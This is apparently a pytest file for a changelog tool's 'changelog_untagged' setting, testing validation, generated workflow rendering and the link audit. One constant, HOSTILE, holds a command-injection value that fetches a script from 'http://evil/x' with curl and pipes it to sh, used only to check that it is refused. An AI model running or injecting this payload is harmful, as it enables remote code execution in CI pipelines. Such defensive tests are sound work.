"""Where a repository's untagged releases live, and how the three states render.

`--untagged` is the right shape -- which `## [x.y.z]` sections were never
tagged is a fact about **one** repository, and the constant it replaced
arrived in this copy still naming another project's 0.11.0 through 0.19.0
(#101, #121). But the value had exactly one home: a command line. The
generated workflow is an owned file, rewritten in full by every
`/oss:scaffold --apply`, so a managed repository could not declare anything
that survived.

`changelog_untagged` in `.oss.json` is that home. It carries three states and
they must stay three all the way to the receipt a maintainer reads:

* **absent or null** -- nobody declared anything. Every release section is
  expected to carry a link ref, and that is this tool's default reading rather
  than a statement the repository made.
* **`[]`** -- declared empty. The repository states that every release section
  was tagged. Behaviourally identical to the above and epistemically not, which
  is the whole reason it is written down.
* **`["0.1.0"]`** -- declared. Those sections are exempt and the receipt names
  them.

Every "renders this" case below sits beside a "renders something else" case
built from the same fixture, because an assertion that a flag is absent from a
string also passes when the renderer produced nothing at all.
"""

import re
import shlex
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import oss_config  # noqa: E402
import oss_rules  # noqa: E402
import scaffold  # noqa: E402

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "scripts" / "assemble_changelog.py"
GENERATED_WORKFLOW = ".github/workflows/oss-changelog.yml"

OK = 0
SKIPPED = 1
REFUSED = 2

#: A hostile declaration. The value is interpolated into a `run:` line of a
#: workflow written into somebody else's repository, exactly as `changelog_dir`
#: is (#31), so the shape is refused at validation rather than escaped at the
#: template. Quoting is what the template does anyway; the refusal is what
#: makes the quoting not the only thing standing there.
HOSTILE = "0.1.0$(curl -s http://evil/x|sh)"


def _config(**overrides):
    config = {
        "repo": "owner/name",
        "default_branch": "main",
        "clone": "/src/name",
        "worktree_root": "/src/name-wt",
        "branch_pattern": "fix/{issue}",
        "test_command": "pytest",
        "version_sites": ["README.md"],
        "changelog_dir": "changelog.d",
        "docs_targets": ["README.md"],
        "labels": {"priority": [], "lanes": []},
        "state_file": ".max/oss-watch.json",
    }
    config.update(overrides)
    return config


# --------------------------------------------------------------------------- #
# .oss.json: the key exists, and its shape is refused rather than escaped
# --------------------------------------------------------------------------- #

def _untagged_problems(value, absent=False):
    config = _config()
    if not absent:
        config["changelog_untagged"] = value
    return [p for p in oss_config.validate(config) if "changelog_untagged" in p]


def test_changelog_untagged_is_a_known_key():
    """Unknown keys are refused by name. Without this the key is a typo to
    `validate()` and every repository that declares one is told so."""
    assert "changelog_untagged" in oss_config.KNOWN_KEYS
    # It is the project's answer, not this machine's: it must be tracked.
    assert "changelog_untagged" in oss_config.PROJECT_KEYS
    # And optional: a config written before this key existed stays valid.
    assert "changelog_untagged" not in oss_config.REQUIRED_KEYS
    assert _untagged_problems(None, absent=True) == []


def test_absent_null_and_empty_are_all_accepted():
    """The three states are all legal input. Only the first two are the same
    behaviour, and none of the three is an error."""
    assert _untagged_problems(None, absent=True) == []
    assert _untagged_problems(None) == []
    assert _untagged_problems([]) == []
    assert _untagged_problems(["0.1.0", "0.2.0"]) == []


@pytest.mark.parametrize("value", [
    HOSTILE,                 # a command substitution, and not a list either
    "0.1.0",                 # a bare string where a list belongs
    ["0.1"],                 # not x.y.z
    ["v0.1.0"],              # the tag spelling, not the version
    ["0.1.0 0.2.0"],         # space-separated inside one entry
    [17],                    # not a string at all
    ["0.1.0,0.2.0"],         # the comma belongs between list entries
    [HOSTILE],
])
def test_an_untagged_declaration_that_is_not_a_list_of_versions_is_refused(value):
    problems = _untagged_problems(value)
    assert problems, "accepted {!r}".format(value)


def test_the_refusal_names_the_key_and_the_offending_value():
    problem = _untagged_problems([HOSTILE])[0]
    assert "changelog_untagged" in problem
    assert HOSTILE in problem, problem


# --------------------------------------------------------------------------- #
# The generated workflow carries it, and the three states render apart
# --------------------------------------------------------------------------- #

def _check_links_line(config):
    """The generated workflow's `--check-links` command line, on its own."""
    body = scaffold.render_owned(GENERATED_WORKFLOW, config, plugin_root=REPO_ROOT)
    lines = [line.strip() for line in body.splitlines()
             if "--check-links" in line and not line.strip().startswith("#")]
    assert len(lines) == 1, lines
    return lines[0]


def test_the_generated_workflow_declares_the_repositorys_untagged_versions():
    line = _check_links_line(_config(changelog_untagged=["0.1.0", "0.2.0"]))
    assert "--untagged '0.1.0,0.2.0'" in line, line


def test_absent_and_empty_render_differently_in_the_generated_workflow():
    """The must-fire and must-not-fire halves in one fixture. An assertion that
    `--untagged` is absent also passes when the renderer produced nothing."""
    absent = _check_links_line(_config())
    empty = _check_links_line(_config(changelog_untagged=[]))
    declared = _check_links_line(_config(changelog_untagged=["0.1.0"]))

    assert "--untagged" not in absent, absent
    assert "--untagged " + chr(39) * 2 in empty, empty
    assert "--untagged '0.1.0'" in declared, declared
    # The control: all three are real invocations, not an empty string.
    for line in (absent, empty, declared):
        assert "--check-links" in line and "assemble_changelog.py" in line, line


def test_the_workflow_says_which_of_the_three_states_it_was_built_from():
    """The rendered flag is the machine's receipt. A maintainer reading the
    file gets a sentence too, because "no flag" and "declared nothing" look
    the same on a command line and are not the same decision."""
    bodies = {
        "absent": scaffold.render_owned(
            GENERATED_WORKFLOW, _config(), plugin_root=REPO_ROOT),
        "empty": scaffold.render_owned(
            GENERATED_WORKFLOW, _config(changelog_untagged=[]), plugin_root=REPO_ROOT),
        "declared": scaffold.render_owned(
            GENERATED_WORKFLOW, _config(changelog_untagged=["0.1.0"]), plugin_root=REPO_ROOT),
    }
    assert len(set(bodies.values())) == 3, "two of the three states render identically"
    for name, body in bodies.items():
        assert "changelog_untagged" in body, name
        assert "__UNTAGGED__" not in body, name


def test_a_hostile_untagged_never_reaches_a_generated_run_line():
    """`render_owned()` is reachable without `validate()` ever being called, so
    the refusal is repeated here -- the same reasoning as `changelog_dir` (#31)."""
    with pytest.raises(scaffold.ScaffoldError) as refusal:
        scaffold.render_owned(
            GENERATED_WORKFLOW, _config(changelog_untagged=[HOSTILE]),
            plugin_root=REPO_ROOT)
    assert "changelog_untagged" in str(refusal.value)
    # The control: a well-formed declaration in the same position renders.
    assert "--untagged '0.1.0'" in _check_links_line(_config(changelog_untagged=["0.1.0"]))


def test_the_whole_scaffold_refuses_a_hostile_untagged(tmp_path):
    hostile = _config(changelog_untagged=[HOSTILE])
    with pytest.raises(scaffold.ScaffoldError):
        scaffold.plan(tmp_path, hostile)
    with pytest.raises(scaffold.ScaffoldError):
        scaffold.apply(tmp_path, hostile, plugin_root=REPO_ROOT)
    assert not (tmp_path / ".github").exists(), "the scaffold wrote files before refusing"


# --------------------------------------------------------------------------- #
# The shipped rule names the repository's own answer
# --------------------------------------------------------------------------- #

def test_the_shipped_rule_names_this_repositorys_untagged_versions(tmp_path):
    """The rule explained the flag generically, which is a rule about a tool
    rather than about the repository it was installed into (#101)."""
    (tmp_path / ".oss").mkdir()
    (tmp_path / ".oss" / "assemble_changelog.py").write_text("", encoding="utf-8")
    oss_rules.install(tmp_path, fragments_dir="changelog.d", untagged=["0.1.0"])
    rule = (tmp_path / ".claude" / "jit-context" / "paths" / oss_rules.LAYER
            / "changelog-fragments.md").read_text(encoding="utf-8")
    assert "--untagged '0.1.0'" in rule, rule


def test_the_rules_three_states_render_apart():
    def _rule(untagged):
        return oss_rules.changelog_fragments(".oss/assemble_changelog.py",
                                             "changelog.d", untagged)
    absent, empty, declared = _rule(None), _rule([]), _rule(["0.1.0"])
    assert len({absent, empty, declared}) == 3, "two of the three states render identically"
    assert "--untagged" not in absent, absent
    assert "--untagged " + chr(39) * 2 in empty, empty
    assert "--untagged '0.1.0'" in declared, declared


# --------------------------------------------------------------------------- #
# The audit own receipt keeps the three states apart
# --------------------------------------------------------------------------- #

TAGGED = """# Changelog

## [Unreleased]

## [0.2.0] - 2026-02-02

### Added

- The second release.

## [0.1.0] - 2026-01-01

### Added

- The first release.

[Unreleased]: https://github.com/o/r/compare/v0.2.0...HEAD
[0.2.0]: https://github.com/o/r/releases/tag/v0.2.0
[0.1.0]: https://github.com/o/r/releases/tag/v0.1.0
"""

#: The same file with 0.1.0 definition removed: the state
#: `Digital-Process-Tools/claude-jit-context` is in, and cannot get out of.
UNTAGGED_FIRST = "".join(
    line for line in TAGGED.splitlines(True)
    if not line.startswith("[0.1.0]:"))


def _repo(tmp_path, text, name="repo"):
    root = tmp_path / name
    root.mkdir(parents=True)
    (root / ".git").mkdir()
    (root / "changelog.d").mkdir()
    (root / "CHANGELOG.md").write_text(text, encoding="utf-8")
    return root


def _check_links(root, *extra):
    return subprocess.run(
        [sys.executable, str(SCRIPT), "--check-links",
         "--dir", "changelog.d", "--changelog", "CHANGELOG.md", *extra],
        cwd=str(root), capture_output=True, text=True,
    )


def test_the_fixture_pair_differs_in_exactly_the_link_ref():
    """The fixtures every assertion below leans on. Built by a filter, so a
    filter that matched nothing would leave the two identical and every
    must-refuse case would be auditing the must-pass file."""
    assert UNTAGGED_FIRST != TAGGED
    assert "## [0.1.0]" in UNTAGGED_FIRST
    assert "[0.1.0]: https" not in UNTAGGED_FIRST
    assert "[0.2.0]: https" in UNTAGGED_FIRST


def test_the_receipt_tells_declared_nothing_from_declared_empty(tmp_path):
    """Both are "no version is exempt" and only one of them was decided. A
    receipt that renders them identically is the absence this repository is
    named after, one layer up from where it usually bites."""
    root = _repo(tmp_path, TAGGED)
    silent = _check_links(root)
    empty = _check_links(root, "--untagged", "")

    assert silent.returncode == OK, silent.stdout + silent.stderr
    assert empty.returncode == OK, empty.stdout + empty.stderr
    assert silent.stdout != empty.stdout, silent.stdout
    assert "none declared" in silent.stdout, silent.stdout
    assert "declared empty" in empty.stdout, empty.stdout


def test_the_receipt_names_what_it_exempted(tmp_path):
    """The third state, and its control: the same file audited without the
    declaration refuses, so `ok` above is the declaration being honoured
    rather than the audit finding nothing to say."""
    root = _repo(tmp_path, UNTAGGED_FIRST)
    declared = _check_links(root, "--untagged", "0.1.0")
    assert declared.returncode == OK, declared.stdout + declared.stderr
    assert "untagged" in declared.stdout and "0.1.0" in declared.stdout, declared.stdout

    silent = _check_links(root)
    assert silent.returncode == REFUSED, silent.stdout
    assert "`## [0.1.0]` has no link ref" in silent.stdout, silent.stdout


def test_a_refusal_also_says_what_was_declared(tmp_path):
    """The state #121 was reported from: the leg is red, and the reader has to
    know whether a declaration was made at all before the finding means
    anything."""
    root = _repo(tmp_path, UNTAGGED_FIRST)
    refusal = _check_links(root)
    assert refusal.returncode == REFUSED, refusal.stdout
    assert "none declared" in refusal.stdout, refusal.stdout


def test_a_declared_version_with_no_section_is_a_finding(tmp_path):
    """An exemption for a section that is not there costs nothing and reports
    nothing, which is how a stale declaration outlives the history it
    described -- the defect the emptied constant was fixing."""
    root = _repo(tmp_path, TAGGED)
    stale = _check_links(root, "--untagged", "9.9.9")
    assert stale.returncode == REFUSED, stale.stdout + stale.stderr
    assert "no `## [9.9.9]` section" in stale.stdout, stale.stdout

    # The positive control, from the same fixture family: a declaration for a
    # section that IS there is not reported as stale. Without it the assertion
    # above passes on a checker that calls every declaration stale.
    live = _repo(tmp_path, UNTAGGED_FIRST, name="live")
    result = _check_links(live, "--untagged", "0.1.0")
    assert result.returncode == OK, result.stdout + result.stderr
    assert "no `## [0.1.0]` section" not in result.stdout, result.stdout


# --------------------------------------------------------------------------- #
# The declaration survives a round trip through the config file
# --------------------------------------------------------------------------- #

def test_a_declared_version_reaches_the_audit_that_reads_it(tmp_path):
    """End to end, because every layer above passes on its own while the chain
    between them is broken: config -> generated workflow -> the command CI runs."""
    root = _repo(tmp_path, UNTAGGED_FIRST)
    line = _check_links_line(_config(changelog_untagged=["0.1.0"]))
    _, _, tail = line.partition("assemble_changelog.py")
    arguments = shlex.split(tail.split("||")[0])
    result = subprocess.run(
        [sys.executable, str(SCRIPT), *arguments],
        cwd=str(root), capture_output=True, text=True,
    )
    assert result.returncode == OK, result.stdout + result.stderr
    assert result.stdout.startswith("assemble    : ok"), result.stdout


def test_build_emits_the_key_so_a_maintainer_can_see_it():
    """Written as null rather than omitted. The probe cannot measure which
    sections were never tagged, and a key absent from the file it is supposed
    to be declared in is a key nobody finds."""
    config = oss_config.build({
        "repo": "owner/name",
        "default_branch": "main",
        "clone": "/src/name",
        "files": [],
        "labels": [],
        "milestones": [],
        "tags": [],
        "merge_method": "squash",
        "version_evidence": {},
        "workflow_jobs": [],
    })
    assert "changelog_untagged" in config
    assert config["changelog_untagged"] is None

# --------------------------------------------------------------------------- #
# This repository's own two declarations, held against each other
# --------------------------------------------------------------------------- #

def test_this_repositorys_workflow_and_config_declare_the_same_versions():
    """`.github/workflows/changelog.yml` is this repository's own file rather
    than the scaffolded `oss-changelog.yml`, so nothing regenerates it from
    `.oss.json` and the two can drift apart silently. Two declarations of the
    same fact is the state the key was added to end; while both exist, this is
    what keeps them equal.
    """
    import json
    declared = json.loads(
        (REPO_ROOT / ".oss.json").read_text(encoding="utf-8")
    ).get("changelog_untagged")
    assert declared is not None, (
        ".oss.json declares no changelog_untagged. This repository has an "
        "untagged 0.1.0 -- an absent key here means the comparison below has "
        "nothing to compare and would pass on any workflow at all."
    )

    workflows = sorted((REPO_ROOT / ".github" / "workflows").glob("*.yml"))
    assert workflows, "no workflows found -- this assertion cannot see anything"

    found = []
    for path in workflows:
        for line in path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if stripped.startswith("#") or "--check-links" not in stripped:
                continue
            _, _, tail = stripped.partition("assemble_changelog.py")
            arguments = shlex.split(tail)
            if "--untagged" in arguments:
                value = arguments[arguments.index("--untagged") + 1]
                found.append((path.name, sorted(v for v in value.split(",") if v)))
            else:
                found.append((path.name, []))

    assert found, (
        "no workflow runs --check-links, so there is nothing to hold against "
        ".oss.json -- a comparison with one side missing is not a comparison"
    )
    for name, versions in found:
        assert versions == sorted(declared), (
            "{} declares {} and .oss.json declares {} -- the two answers to "
            "'which versions were never tagged' have drifted".format(
                name, versions, sorted(declared))
        )

# --------------------------------------------------------------------------- #
# The collapse, guarded where it actually happened
# --------------------------------------------------------------------------- #

#: `x or []` is the idiomatic Python way to default a value, and it is exactly
#: wrong here: `None` and `[]` are both falsy and mean different things. The
#: first draft of this change shipped that expression in two documented command
#: lines, so every repository that had declared nothing would have been told, by
#: the tool that exists to keep the two apart, that it had declared empty. Found
#: in review rather than by a test, which is why there is now a test.
_EMPTY_LITERALS = r"\[\s*\]|" + chr(34) * 2 + "|" + chr(39) * 2
COLLAPSE_RE = re.compile(
    r"changelog_untagged[^\n]{0,80}?\bor\b\s*(?:" + _EMPTY_LITERALS + r")")

#: Every surface that could build the declaration into a command.
COLLAPSE_SURFACES = (
    REPO_ROOT / "commands" / "changelog.md",
    REPO_ROOT / "changelog.d" / "README.md",
    REPO_ROOT / "scripts" / "scaffold.py",
    REPO_ROOT / "scripts" / "oss_rules.py",
    REPO_ROOT / "scripts" / "oss_config.py",
    REPO_ROOT / "README.md",
)


def test_the_collapse_detector_fires_on_the_expression_it_is_named_for():
    """The control. A regex that matches nothing turns the sweep below into a
    sweep that never looked -- which is this repository's whole subject."""
    assert COLLAPSE_RE.search(
        'join(json.load(open(".oss.json")).get("changelog_untagged") or [])')
    assert COLLAPSE_RE.search('u = config.get("changelog_untagged") or []')
    # The must-not-fire half, in the same fixture: reading the key without
    # collapsing it, and an unrelated `or []`, are both fine.
    assert not COLLAPSE_RE.search('u = config.get("changelog_untagged")')
    assert not COLLAPSE_RE.search('versions = config.get("version_sites") or []')


def test_no_surface_folds_absent_and_empty_together():
    seen = 0
    offenders = []
    for path in COLLAPSE_SURFACES:
        if not path.exists():
            continue
        text = path.read_text(encoding="utf-8")
        seen += text.count("changelog_untagged")
        for number, line in enumerate(text.splitlines(), 1):
            if COLLAPSE_RE.search(line):
                offenders.append("{}:{}: {}".format(path.name, number, line.strip()))

    assert seen, (
        "no surface mentions changelog_untagged at all, so this sweep checked "
        "nothing -- either the key was renamed or COLLAPSE_SURFACES is stale"
    )
    assert not offenders, (
        "these default an absent declaration to an empty one. Both are falsy "
        "and they are different states: absent is 'nobody decided', empty is "
        "'this repository decided nothing is exempt'. " + "; ".join(offenders)
    )
